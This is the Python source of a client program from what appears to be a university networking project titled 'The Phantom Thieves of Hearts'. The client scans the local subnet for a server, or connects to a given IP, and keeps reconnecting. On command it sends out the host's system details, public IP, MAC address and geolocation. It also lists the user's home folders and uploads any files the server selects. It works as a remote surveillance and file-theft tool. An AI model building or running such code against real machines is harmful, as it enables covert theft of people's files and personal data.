#  Progetto Reti - The Phantom Thieves of Hearts (Take your time)
#
#
#
#
#                                                                     ,,,,,,,,,,,
#                                                              ,,,,,,,,,,,,
#                                                         ,,,,,,,,,,,,, ,,,   ,
#                                                    ,,,,,,,,,,,,,,, ,, ,,,    ,
#                                                 ,,,,,,,,,,,,,,,,,,,,, ,,,, , ,
#                                              ,,,,,,,,,,,,,,,,,,,,,,,,, ,,,   ,.
#                                             ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,, ,,,
#                                           ,,,,,,,,,,,,,   ,,,,,,,,,,,,, ,,,,  ,
#                                           ,,,,,,,,,         ,,,,,,,,,,,, ,,,  ,,
#                                                            , ,,,,,,,,,,,,.,,,  ,
#                                                             ,,,,,,,,,,,,,,,,,, ,,                        @
#                                                               , ,,,,,,,,,,,,,,           ,
#                                                                , ,,,,,,,,,,, ,      ,,                      @@
#                                                                   ,,,,,,,,,,  ,, ,,        @@       ,     @
#                                                                    ,,,,,,, ,,,,,,      &@@   ,,,,,,,,   @@
#                                                                      ,, ,,,,,,,      @@@@ ,,,, @ ,,,  @@@
#                                                                     ,,,,,,, ,      @@@@@@,,,,@@ ,,,@@@@@
#                                                                 ,,,,,,,,,, ,    ,, @@@@@@@,, @@@@@@@@@(
#                                                                  ,,,,,,,,,,  @,,,,,@@@@@@@@ ,,,,,
#                                                                   ,,,,,,,,  @ ,,,,&@@@@@@ ,,,,,,,
#                                                       ,,,,,,       ,,,, ,  @@@@ @@@@@@@@@ ,, ,,,
#                                                  ,,,,,,,,,,,,       , ,,, @@@@@@@@@@@@@@@@@ ,,,
#                                                ,,,,,,,,,,,,,,,,      , , @@@@@@@@@@@@@@@  ,,,
#                                               ,,,,,,,,,,,,,,,,,,,,,,, ,,,,@@@@@@@@@ ,,,,,,,,
#                                                ,,,,,,,,,,,,,,,,,,,,  ,,,.@@@@@@@@@    @ ,,
#                                                   ,,,,,,,,, ,,,    ,,,,,@@@@@.@@@@@@, ,,
#                                                              @@@@   .,,, ,,,,,,,,,,,,,
#                                                                 @@   ,,,,,,,,,,,,,,,
#
#
#
#
#  Autori:
#  ALEX CIACCIARELLA    N86003179
#  STEFANO DE FENZA    N86003446
#  ELVINO BUONANNO      N86003302
#  GUGLIELMO DE BIASIO     N86003216
#

import json
import logging
import math
import platform
import re
import shutil
import signal
import socket
import time
import uuid
from datetime import datetime
import ipaddress
from pathlib import Path
import os

# imported Libraries
# import ipinfo
import psutil
from cpuinfo import get_cpu_info
import ipinfo
import click

access_token = ''
IpAddr = ""
Port = 58131
info = {}
s = socket.socket()
connected = False

# For Threading
Connesso = True


# For Options


def CreaSocket() -> bool:
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket Created
        print("Socket Created")
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return True
    except socket.error as e:
        logging.exception(e)
        return False


def Cliente() -> bool:
    global s, info
    print("sono prima della receive")
    req = s.recv(1024).decode()
    print("sono dopo della receive")
    print(f"Ecco cosa mi è arrivato dal server: {req}")

    info = {}

    if req == '1':
        data = GetGeneralInfo()
        s.send(data)
        return True
    elif req == '2':  # CPU
        data = Cores()
        s.send(data)
        return True
    elif req == '3':  # RAM
        data = ram()
        s.send(data)
        return True
    elif req == '4':  # PARTITION
        data = Partizioni()
        s.send(data)
        return True
    elif req == '5':  # NETWORK
        data = Network()
        s.send(data)
        return True
    elif req == '6':  # GEOLOCATION
        data = Geolocation()
        s.send(data)
        return True
    elif req == '7':
        fileRetrieval()
        return True
    elif req == 'quit':
        return False


def getTokenFromConnection():
    global s, connected, access_token
    counter = 0
    while not connected:
        try:
            print("Provo a ricevere il token dal server")
            access_token = s.recv(100).decode()
            connected = True
            print(f"token : {access_token}")
            return True
        except socket.error as se:
            counter += 1
            print("Error getting token from the socket. Retrying in 5 min")
            time.sleep(5)
            if counter == 5:
                return False


def fileRetrieval():
    paths = getPaths()
    s.sendall(paths.encode())
    file_numbers = scanDir()
    print(len(file_numbers))
    s.sendall(file_numbers)
    print("Ho inviato il path")
    status = s.recv(1092).decode("utf-8")
    if status == "quit":
        return
    time.sleep(2)
    uploaderFunction()


@click.command()
@click.option('--ip', default="127.0.0.1", help="Inserisci l'ip a cui vuoi che il client si connetta")
def main(ip: str):
    global connected, IpAddr

    while True:
        resp = True
        connected = False
        CreaSocket()  # Socket Appena Creato

        if ip == "127.0.0.1":
            print("L'applicazione è stata avviata senza ip... Procedo a cercare automaticamente quello del server...")
            mainSearchFunction()
        else:
            print(f"L'applicazione è stata avviata con un ip da controllare: {ip}")
            while True:
                if loop2(ip):
                    IpAddr = ip
                    break
                else:
                    time.sleep(5)


        # Se esce da qui ha trovato il server

        risp = getTokenFromConnection()
        if risp:
            # token mandato al server per l'ip

            # Richieste per le info di sistema
            print(f"resp prima del loop: {resp}")
            while resp:
                resp = Cliente()
            try:
                s.shutdown(socket.SHUT_RDWR)
            except socket.error as e:
                logging.error(f"Errore nella chiusura del socket: {e}")
            s.close()
            print("Connection Closed by the server, retrying to connect in about 20 seconds...")
            time.sleep(20)


def General():
    global info
    try:
        os_name = platform.system()
        version = platform.version()
        info['os'] = f"{os_name} - v. {version}"
        info['hostname'] = socket.gethostname()
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.fromtimestamp(boot_time_timestamp)
        info['Boot time'] = str(f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}")
    except Exception as e:
        logging.exception(e)


def Cores():
    global info
    try:
        cpu_name = get_cpu_info()['brand_raw']
        cpu_family = platform.processor()
        info['processor'] = f"{cpu_name} - {cpu_family}"
        physical_cores = psutil.cpu_count(logical=False)
        total_cores = psutil.cpu_count(logical=True)
        info['cores'] = f"Physical Cores: {physical_cores} - Total Cores: {total_cores}"
        cpufreq = psutil.cpu_freq()
        info['Cpu Frequency'] = f"Current Frequency: {cpufreq.current} - Max Frequency: {cpufreq.max}"
    except Exception as e:
        logging.exception(e)
    return json.dumps(info, indent=4).encode("utf-8")


def ram():
    global info
    try:
        info['ram'] = convertRam(
            psutil.virtual_memory().total)
        return json.dumps(info, indent=4).encode("utf-8")
    except Exception as e:
        logging.exception(e)


def convertRam(size_bytes):
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return "%s %s" % (s, size_name[i])


def Partizioni():
    global info
    try:
        total, used, free = shutil.disk_usage("/")

        info['Total Disk Memory'] = "Total: %d GiB" % (total // (2 ** 30))
        info['Used Disk Memory'] = "Used: %d GiB" % (used // (2 ** 30))
        info['Free Disk Memory'] = "Free: %d GiB" % (free // (2 ** 30))
        return json.dumps(info, indent=4).encode("utf-8")
    except Exception as e:
        logging.exception(e)


def Network():
    global info
    try:
        handler = ipinfo.getHandler(access_token)
        details = handler.getDetails()
        info['ip-address'] = details.ip
        info['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        return json.dumps(info, indent=4).encode("utf-8")
    except Exception as e:
        logging.exception(e)


def Geolocation():
    global info
    try:
        handler = ipinfo.getHandler(access_token)
        details = handler.getDetails()
        city = details.city
        region = details.region
        country = details.country
        postal = details.postal
        location = details.loc
        ISP = details.org
        info['Location'] = f"{city}, {region}, {country}, postal code : {postal}"
        info['Latitude and Logitude'] = f"{location}"
        info['Internet ISP'] = f"{ISP}"
        return json.dumps(info, indent=4).encode("utf-8")
    except Exception as e:
        print(f"Errore nel retrivial della location del computer : {logging.error(e)}")


def IsConnected() -> bool:
    try:
        host = "1.1.1.1"
        host = socket.gethostbyname(host)
        s = socket.create_connection((host, 80), 2)
        s.close()
        return True
    except Exception as e:
        return False


def GetGeneralInfo():
    global info

    General()
    Cores()
    ram()
    Partizioni()
    if IsConnected():
        Network()
        Geolocation()

    return json.dumps(info, indent=4).encode("utf-8")


def getPaths():
    home = Path.home()
    dictionary = {}
    count = 1
    for root, dirs, filenames in os.walk(home):
        for d in dirs:
            if not d.startswith("."):
                dictionary[f"{count}) {d}"] = os.path.join(home, d)
                count += 1
        break  # prevent descending into subfolders

    return json.dumps(dictionary)


def scanDir():
    input = s.recv(1092).decode()
    input = input.replace('"', '')
    input = input.replace(" ", "")
    count = 1
    file_number = []
    for root, dir, files in os.walk(input):
        for file in files:
            file_number.append(os.path.join(root, file))
            count += 1

    return json.dumps(file_number).encode("utf-8")


def uploaderFunction():
    #found_files = recvall(s).decode()
    found_files = scanDir()
    found_files = json.loads(found_files)
    #found_files = json.loads(found_files)  # lista dei file trovati nel path scelto

    time.sleep(3)

    files_by_number = s.recv(8192).decode()
    files_by_number = json.loads(files_by_number)  # lista dei file da scaricare

    amount_of_files = len(files_by_number)

    s.send(str(amount_of_files).encode("utf-8"))

    for i in files_by_number:
        file_to_open = str(found_files[i - 1])
        with open(file_to_open, 'rb') as file_to_send:
            file_info_struct = os.stat(file_to_open)
            file_size = file_info_struct.st_size
            s.send(str(file_size).encode("utf-8"))  # filesize
            s.recv(100).decode()
            s.send(file_to_open.encode("utf-8", "ignore"))
            s.recv(100).decode("utf-8")
            file_data = file_to_send.read()
            s.sendall(file_data)
            s.recv(1092).decode("utf-8")


def signal_handler(signal, frame):
    print("Keyboard Interrupt received: closing connection...")
    s.close()
    exit(0)


#  --------------------------------IP CHECKING FUNCTIONS--------------------------------------------------------------#


def mainSearchFunction():
    print("Scannerizzo gli ip della sottorete per trovare quello del server...")
    ricerca = False

    cerca(ricerca)
    print(f"Sono riuscito a trovare un Server con indirizzo {IpAddr}")


def cerca(ricerca):
    list1 = splitter()
    while not ricerca:
        retry = loop(list1)
        if retry == False:
            ricerca = True
        else:
            print("Riprovo a cercare gli indirizzi IP... tra 5 secondi")
            time.sleep(5)


def loop(lista):
    global Connesso, IpAddr
    retry = True
    for i in lista:
        if Connesso == True and s.connect_ex((socket.gethostbyname(str(i)), Port)) == 0:  # checkConnection(i):
            print(f"Sono riuscito a connettermi a {i} ")
            IpAddr = str(i)
            retry = False
            return retry
        elif not Connesso:
            pass
        else:
            print(f"Non sono riuscito a connettermi a {i} ")
            time.sleep(1)
    return retry


def loop2(ip):
    global Connesso, IpAddr
    if Connesso == True and s.connect_ex((ip, Port)) == 0:  # checkConnection(i):
        print(f"Sono riuscito a connettermi a {ip} ")
        IpAddr = str(ip)
        return True
    elif not Connesso:
        pass
    else:
        print(f"Non sono riuscito a connettermi a {ip} ")
        return False
    return False


def splitter():
    numberlist = []
    for i in range(2, 254):
        numberlist.append(f"192.168.1.{i}")
    return numberlist


if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    main()
